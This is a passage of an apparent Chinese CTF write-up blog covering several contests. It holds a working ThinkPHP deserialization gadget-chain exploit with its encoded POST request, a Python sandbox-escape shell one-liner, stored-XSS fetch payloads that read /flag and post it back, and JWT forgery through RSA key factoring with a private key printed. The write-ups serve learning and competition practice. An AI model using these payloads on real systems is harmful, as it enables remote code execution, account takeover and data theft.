class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">                <span class="variable">$lists</span>[] = [</span><br><span class="line">                    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$data</span>-&gt;id,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$data</span>-&gt;name,</span><br><span class="line">                    <span class="string">&quot;score1&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score1,</span><br><span class="line">                    <span class="string">&quot;score2&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score2,</span><br><span class="line">                    <span class="string">&quot;score3&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score3,</span><br><span class="line">                    <span class="string">&quot;average&quot;</span> =&gt; <span class="variable">$data</span>-&gt;average];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$lists</span>, <span class="string">&quot;count&quot;</span>=&gt;<span class="variable">$count</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;获取成功&quot;</span>, ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>会发现其利用了<code>is_null($userinfo)</code>来检测登陆状态(怎么登陆后面再说)，检测通过后就可以进入道反序列的代码了。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line"><span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;serialize&#x27;</span>)-&gt;<span class="title function_ invoke__">page</span>(<span class="variable">$page</span>,<span class="variable">$limit</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$datas</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>上面是关键的几句代码。我们可以看到先键Datas对象实例化成db，再从db中查询具serialize的数据并赋值个<code>$datas</code>，datas变量有经过循环赋值给<code>data</code>再对<code>$data[&#39;serialize&#39;]</code>进行反序列化。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">            <span class="comment">// if(preg_match(&quot;/include|include_once|require|require_once|highlight_file|fopen|readfile|fread|fgetss|fgets|parse_ini_file|show_source|flag|move_uploaded_file|file_put_contents|unlink|eval|assert|preg_replace|call_user_func|call_user_func_array|array_map|usort|uasort|uksort|array_filter|array_reduce|array_diff_uassoc|array_diff_ukey|array_udiff|array_udiff_assoc|array_udiff_uassoc|array_intersect_assoc|array_intersect_uassoc|array_uintersect|array_uintersect_assoc|array_uintersect_uassoc|array_walk|array_walk_recursive|xml_set_character_data_handler|xml_set_default_handler|xml_set_element_handler|xml_set_end_namespace_decl_handler|xml_set_external_entity_ref_handler|xml_set_notation_decl_handler|xml_set_processing_instruction_handler|xml_set_start_namespace_decl_handler|xml_set_unparsed_entity_decl_handler|stream_filter_register|set_error_handler|register_shutdown_function|register_tick_function|system|exec|shell_exec|passthru|pcntl_exec|popen|proc_open/i&quot;,$data))&#123;</span></span><br><span class="line">            <span class="comment">//     return json([&quot;code&quot;=&gt;404,&quot;msg&quot;=&gt;&quot;你想干嘛！！！&quot;]);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//            随便吧，无所谓了，不想再编程下去了</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="variable">$data</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;修改成功&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>我们再进行代码审计。会发现在update方法中存在上传<code>$request-&gt;post(&#39;data&#39;);</code>数据至db，且db也是Datas对象的实例。<br>那么这个我们就可以通过触发update方法上传网上利用的poc至Datas，再触发list方法就可以成功进行反序列化了。<br>那么我们就发现了这个反序列的利用入口。就只差最后一步了，就是如何绕过登陆。<br>我们再进行代码审计，会发现其存在应该方法为Users<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">AdminUser</span>;</span><br><span class="line">        <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$datas</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;获取成功&quot;</span>, ]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>我们会发现他会在屏幕回显adminUser的信息。<br>还有最后一个问题我们应该怎么触发这些方法呢？这时候我们就需要查看开发者手册了。<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/Thinkphp-3.png" class="" title="alt text"><br>这里讲了当我们需要访问应该对象的方法时我们可以直接使用<code>url/对象名/方法名</code>来进行调用。<br>上面就是代审的所有内容了，相信我写的这么详细聪明的你看到这里肯定是恍然大吧(嘿嘿)。<br>我们输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28065/api/users</span><br></pre></td></tr></table></figure><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp-4.png" class="" title="alt text"><br>回显了账号密码我们直接登陆<br>之后就可以使用api/update还有api/list两个路由进行反序列化了。下面是反序列化的exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=[<span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$withAttr</span>=[<span class="string">&#x27;jiang&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$suffix</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;suffix = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Pivot</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/update HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28065</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://node4.anna.nssctf.cn:28065</span><br><span class="line">Referer: http://node4.anna.nssctf.cn:28065/admin/index</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=ed1a8c62688654d3c80e971dc4478867</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">data=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在访问api/list就可以了<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp-5.png" class="" title="alt text"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="real-signin"><a href="#real-signin" class="headerlink" title="real_signin"></a>real_signin</h2><p>解题人：LSE<br>网上一搜就能搜道这些是小品的内容，再用计算机算一下md加密一下。</p>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>解题人：LSE<br>沙箱逃逸网上能搜到<br><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code><br>这样就可以getshell之后就ls cat /flag</p>
<h2 id="是名取证"><a href="#是名取证" class="headerlink" title="是名取证"></a>是名取证</h2><p>解题人：LSE<br>非预期了直接将内存镜像放发哦010里查flag3就查到了</p>
<h2 id="佛说取证"><a href="#佛说取证" class="headerlink" title="佛说取证"></a>佛说取证</h2><p>解题人：LSE<br>这题我先是在AXIOM Process上找到了flag1.zip和flag2.zip。然后不知道这么导出文件就用了volatility来导出文件<br>volatility -f 1.vmem —profile=Win7SP1x64 filescan | grep “flag”来找出文件，就是不知道为什么我找不到flag1，所有我grep上了我之前在AXIOM Process上找到的flag1的路径<br>然后导出文件<br>volatility -f 1.vmem —profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./<br>导出之后发现是佛有曰是要密码的，这是我在剪切板发现了一串字符串。再以其为密钥解码佛又曰就出来了</p>
<h2 id="喜欢我的手坤吗"><a href="#喜欢我的手坤吗" class="headerlink" title="喜欢我的手坤吗"></a>喜欢我的手坤吗</h2><p>解题人：LSE<br>这题我们可以再网上查一下模拟器怎么删除掉密码，会找到很多文章。对这做我们就能删除其密码。<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sj-1.png" class="" title="alt text"><br>进入手机后我们查看其相册可以发现一个网盘链接下载下来。<br>会得到一串以U2FsdGVkX开头的字符（一开始我以为是base64转图片结果不是）。我们再打开通讯录会发现key，将其拼接起来。再进行AES解码。得到另一长串编码，长得很像base64我们进行解码再导入到010里查看。会发现其开头为zip的文件头，我们搜索 50 4B 03 04 还有50 4B 01 02会发现其后4个字节为偶数是伪加密将其改成00就可以直接解压了。</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Helloworld"><a href="#Helloworld" class="headerlink" title="Helloworld"></a>Helloworld</h2><p>解题人：LSE<br>直接nc连接再ls /<br>cat /flag</p>
<h1 id="LOT"><a href="#LOT" class="headerlink" title="LOT"></a>LOT</h1><h2 id="神秘的OLED情书2-起"><a href="#神秘的OLED情书2-起" class="headerlink" title="神秘的OLED情书2-起"></a>神秘的OLED情书2-起</h2><p>解题：HBQ</p>
<p>题目让我们确定STM32的输入电压（保留1位小数并带上单位）。<br>上网查一下STM32的输入电压范围，发现是2.0~3.6，而只要保留一位小数，所以只有17种可能性，直接穷举法，发现3.3V是正确的flag。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto1921"><a href="#Crypto1921" class="headerlink" title="Crypto1921"></a>Crypto1921</h2><p>解题：ZWK<br>在code的txt文件中，发现摩斯电码密文，将密文转化后，为一段数字用斜杆分隔成四个为一组的数字，通过查阅资料发现，该段数字可通过中文电码译为中文<br>由文字内容可知，事件发生坐标位置，根据单位进行换算，得到符合条件的坐标密码，可解telegram.tet文件<br>由文件内容得将文字由原来格式转化为中文电码，在转为摩斯电码后，经过md5加密，为最终flag压缩包的密码</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎青龙组</title>
    <url>/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/</url>
    <content><![CDATA[<h1 id="其实本来是不想写这篇文章的，因为一直没有环境复现，但想想还是记录一下网鼎的那道xss吧，因为国内ctf-xss比较少，本人对xss的认知也比较一般。因为没有复现环境所以以下大多是口述，比赛的时候忘截图了…"><a href="#其实本来是不想写这篇文章的，因为一直没有环境复现，但想想还是记录一下网鼎的那道xss吧，因为国内ctf-xss比较少，本人对xss的认知也比较一般。因为没有复现环境所以以下大多是口述，比赛的时候忘截图了…" class="headerlink" title="其实本来是不想写这篇文章的，因为一直没有环境复现，但想想还是记录一下网鼎的那道xss吧，因为国内ctf xss比较少，本人对xss的认知也比较一般。因为没有复现环境所以以下大多是口述，比赛的时候忘截图了…"></a>其实本来是不想写这篇文章的，因为一直没有环境复现，但想想还是记录一下网鼎的那道xss吧，因为国内ctf xss比较少，本人对xss的认知也比较一般。因为没有复现环境所以以下大多是口述，比赛的时候忘截图了…</h1><h1 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h1><p>首先随便输入账号密码登陆，服务端会给出hash路径，到后台会发现其会将我们输入的只<br>直接发送到任务栏上，为存储型 xss 漏洞。经过尝试发现使用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>就可以触发xss。</p>
<p>这时我就想着先外带，于是尝试了多个外带的payload结果一直都不行，这时我怀疑，bot是不是只能再本站访问。<br>于是我就写了如下payload来尝试让bot进行post请求将字符”aaa”写入道任务栏中<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&quot;http://0192d601faa97dffa2890e43bf77feeb.i5nk.dg04.ciihw.cn:46662/content/f4a62598d9e423749687a71a0adab246&quot;</span>, &#123;     <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,     <span class="attr">headers</span>: &#123;         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>     &#125;,     <span class="attr">body</span>: <span class="string">&quot;content=&#x27;aaaa&#x27;&quot;</span> &#125;) .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()) .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data));&lt;script&gt;</span><br></pre></td></tr></table></figure><br>结果不行，这就给我整不会了，最后再经过多次尝试发现，bot不会访问带http的url。。。。于是修改以下payload<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&quot;/content/f4a62598d9e423749687a71a0adab246&quot;</span>, &#123;     <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,     <span class="attr">headers</span>: &#123;         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>     &#125;,     <span class="attr">body</span>: <span class="string">&quot;content=&#x27;aaaa&#x27;&quot;</span> &#125;) .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()) .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data));&lt;script&gt;</span><br></pre></td></tr></table></figure><br>就发现其成功进行了访问并写入内容。而flag再flag路由下，我们只要让其访问/flag并将其回显写入道任务栏即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Flag Data:&quot;</span>, data);<span class="title function_">fetch</span>(<span class="string">&#x27;/content/6dd78abd8072067672645b3429746fcd&#x27;</span>, &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;, <span class="attr">body</span>: <span class="string">&quot;content=123&quot;</span> + data &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Response from /content/url:&quot;</span>, result);  &#125;); &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>这题因为没有复现环境就简单复现以下jwt的环节吧，个人让我jwt算这题的难点了</p>
<p>首先python的jwt我们可以尝试使用这个工具来得到公钥<strong>rsa_sign2n</strong><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbTFpbiJ9.FW-UjoD_ldtasCm1OJli6JhnTSicnnGDrkapCnJRkBcfo6rxnzu6sldJI321anP4BRHwJZJHWDW_q22KhAqS9HtS_tJGCJG_t5iX6UbED03yFLrZ_yBoYX0Va-ExC9PNF-2zohPjGP0u9wsF-27120zrpO_9PqkCFze_Xys-VflN eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.HDso3-3ZGjO8_J2ziO5Z2UasjqAl6v50-LrCIe-AmeHRrTWPaJco5Kai5u3eyM4kNInKSjn2fCDjhPvP3-QO2b69BpuNKE7uDRVzuuip6N3T-mnrKBbHrbOPWGFdNIOsPxKyhBn9OC4pOQB5mi5pBXVTh_JCuNXf7dm3_nEz-hY6</span><br></pre></td></tr></table></figure><br><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-120744483.png" class=""><br>这个工具会把公钥生成在同目录文件夹下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgSSlUMfCzg/ysG4ixoi6NKGuWNnv</span><br><span class="line">IpZZTRNa045eH2xzzY/ZyRwDojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fAN</span><br><span class="line">MNCYRa47xIW0RwZBDSABcGnwu3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502</span><br><span class="line">ZMSv0AxMgN5UMh9FCwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-131827779.png" class="">  </p>
<p>我们可以看到公钥是很短的，那直接可以进行拆分。因为我是web手除了在大一时在hgame是打了道RSA的题后面就几乎没有打过了，所以直接上脚本<code>RsaCtfTool</code></p>
<p>还有因为这种环境安多了容易产生冲突所以这样可以使用虚拟环境<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m venv xxxx</span><br><span class="line">cd xxxx/Scripts</span><br><span class="line">./activate</span><br><span class="line"></span><br><span class="line">退出 </span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure><br>然后使用使用工具来获得私钥<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python RsaCtfTool.py --publickey ./public --private</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD</span><br><span class="line">ojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw</span><br><span class="line">u3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB</span><br><span class="line">AoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW</span><br><span class="line">TcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq</span><br><span class="line">URC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu</span><br><span class="line">SCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK</span><br><span class="line">S7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli</span><br><span class="line">uJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl</span><br><span class="line">bXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN</span><br><span class="line">Hf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i</span><br><span class="line">6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR</span><br><span class="line">tCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc</span><br><span class="line">qSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ</span><br><span class="line">jqta99E=</span><br></pre></td></tr></table></figure>
<img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-131838676.png" class="">  
<p>然后使用这个网站来伪造<a href="https://www.bejson.com/jwt/即可，jwt.io有点难用">https://www.bejson.com/jwt/即可，jwt.io有点难用</a><br><img src="/2024/11/01/%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/IMG_20241101-132835853.png" class="">  </p>
]]></content>
      <categories>
        <category>top10</category>
        <category>xss</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>美亚21</title>
    <url>/2024/10/15/%E7%BE%8E%E4%BA%9A21/</url>
    <content><![CDATA[<h1 id="既然报名了美亚当然得学一下取证了，先写一下21年的美亚吧"><a href="#既然报名了美亚当然得学一下取证了，先写一下21年的美亚吧" class="headerlink" title="既然报名了美亚当然得学一下取证了，先写一下21年的美亚吧"></a>既然报名了美亚当然得学一下取证了，先写一下21年的美亚吧</h1><h1 id="检材处理"><a href="#检材处理" class="headerlink" title="检材处理"></a>检材处理</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/1.png" class="" title="alt text">
<p>首先下载的检材有一个电脑的镜像文件，和压缩包<br>解压这个压缩包。<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/2.png" class="" title="alt text"><br>里面是一个加密容器，将加密容器用VeraCrypt打开，进入容器文件，可以发现一个检材列表<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/3.png" class="" title="alt text"><br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/4.png" class="" title="alt text"><br>根据列表一个个整理检材</p>
<h1 id="1-工地主管电话的微信账号是什么"><a href="#1-工地主管电话的微信账号是什么" class="headerlink" title="1.工地主管电话的微信账号是什么?"></a>1.工地主管电话的微信账号是什么?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/5.png" class="" title="alt text">
<p>主办方在手机附件内，带了一个取证软件，我们直接打开这个软件。<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/6.png" class="" title="alt text"></p>
<p>在聊天报告里可以发现，其使用的聊天软件是whatapp，没有微信，所以这题选d，工地主管没有微信</p>
<h1 id="2-工地主管的隔空投送装置置编号是什么"><a href="#2-工地主管的隔空投送装置置编号是什么" class="headerlink" title="2.工地主管的隔空投送装置置编号是什么?"></a>2.工地主管的隔空投送装置置编号是什么?</h1><p>首先了解一下什么是隔空投送<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/7.png" class="" title="alt text"><br>我们搜索AirDrop<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/8.png" class="" title="alt text"></p>
